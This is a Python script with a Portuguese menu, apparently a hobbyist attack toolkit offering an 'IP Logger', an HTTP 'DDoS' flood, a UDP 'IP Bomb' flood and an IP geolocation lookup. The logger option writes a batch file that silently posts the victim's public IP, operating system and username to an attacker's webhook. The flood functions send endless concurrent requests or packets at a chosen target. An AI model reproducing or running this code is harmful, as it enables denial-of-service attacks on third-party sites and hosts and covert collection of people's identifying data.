import aiohttp
import asyncio
import time
import sys
import colorama 
from colorama import Fore
import os 
from pystyle import *
import socket
import requests

colorama.init(convert=True, autoreset=True)
colorama.just_fix_windows_console()


os.system('cls') if os.name == 'nt' else os.system('clear')
print(f"""
{Fore.CYAN}  ██████╗ ██╗     ██╗  ██╗ ██████╗         ██████╗ ███████╗    ██████╗ ███████╗██╗   ██╗███████╗
{Fore.CYAN} ██╔═══██╗██║     ██║  ██║██╔═══██╗        ██╔══██╗██╔════╝    ██╔══██╗██╔════╝██║   ██║██╔════╝
{Fore.CYAN} ██║   ██║██║     ███████║██║   ██║        ██║  ██║█████╗      ██║  ██║█████╗  ██║   ██║███████╗
{Fore.CYAN} ██║   ██║██║     ██╔══██║██║   ██║        ██║  ██║██╔══╝      ██║  ██║██╔══╝  ██║   ██║╚════██║
{Fore.CYAN} ╚██████╔╝███████╗██║  ██║╚██████╔╝        ██████╔╝███████╗    ██████╔╝███████╗╚██████╔╝███████║
{Fore.CYAN}  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝         ╚═════╝ ╚══════╝    ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
{Fore.RESET}                                                                                 

""")
webhook = ""
print(f"{Fore.CYAN} [1] IP Logger{Fore.RESET}")
print(f"{Fore.CYAN} [2] DDoS{Fore.RESET}")
print(f"{Fore.CYAN} [3] IP Bomb{Fore.RESET}")
print(f"{Fore.CYAN} [4] IP Lookup{Fore.RESET}")
print(f"{Fore.CYAN} [5] Sair{Fore.RESET}")
choice = input('==> ')

packets = 0
fetches = 0
url = ""

def ip_lookup(ip_address):
    try:
        response = requests.get(f'https://ipinfo.io/{ip_address}/json')
        if response.status_code == 200:
            data = response.json()
            return {
                "IP": data.get("ip"),
                "City": data.get("city"),
                "Region": data.get("region"),
                "Country": data.get("country"),
                "Location": data.get("loc"),
                "Org": data.get("org"),
                "Hostname": data.get("hostname", "N/A")
            }
        else:
            return {"Error": f"Unable to fetch data (Status Code {response.status_code})"}
    except Exception as e:
        return {"Error": str(e)}

def send_packet(ipa, port):
    global packets
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto('Cyber DoS'.encode('utf-8'), (ipa, port))

    except socket.error as e:
        print(f"Socket error: {e}")
    finally:
        s.close()
def ipbomb(ip, port):
    global packets
    os.system('cls') if os.name == 'nt' else os.system('clear')
    while True:
        send_packet(ip, port)
        packets += 1
        sys.stdout.write(f'Packets sent: {packets} | Ip: {ip}, Port: {port}')
        
async def flood(session, url):
    global fetches
    while True:
        try:
            async with session.get(url) as response:
                fetches += 1
                sys.stdout.write(f"Status: {response.status} | Requests: [{fetches}]\r")
        except Exception as e:
            sys.stdout.write(f"Error: {e}\r")

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [flood(session, url) for _ in range(100)]  # 100 concurrent requests
        await asyncio.gather(*tasks)
        
def buildlogger(wb):
    code = f"""@echo off
:: WEBHOOK
set webhook={wb}

:: GETTING THE IP
curl ifconfig.co/ > ip.txt
set /p ip=<ip.txt
del ip.txt

curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"%ip%\\"}}" %webhook%
curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"%os%\\"}}" %webhook%
curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"%username%\\"}}" %webhook%

"""
    with open('iplogger.bat', 'w', encoding='utf-8') as f:
        f.write(code)
    print("[+] Arquivo 'iplogger.bat' criado com sucesso.")
    

if int(choice) == 1:
    webhook = str(input('Insira o seu webhook: '))
    buildlogger(webhook)
elif int(choice) == 2:
    url = str(input('Insira site alvo: '))
    asyncio.run(main())
elif int(choice) == 3:
    ip = str(input('Insira o ip  alvo: '))
    port = int(input('Insira a porta: '))
    ipbomb(ip, port)
elif int(choice) == 4:
    lookip = str(input('Insira o ip alvo: '))
    result = ip_lookup(lookip)
    for key, value in result.items():
        print(f'{key}: {value}')
    os.system('pause')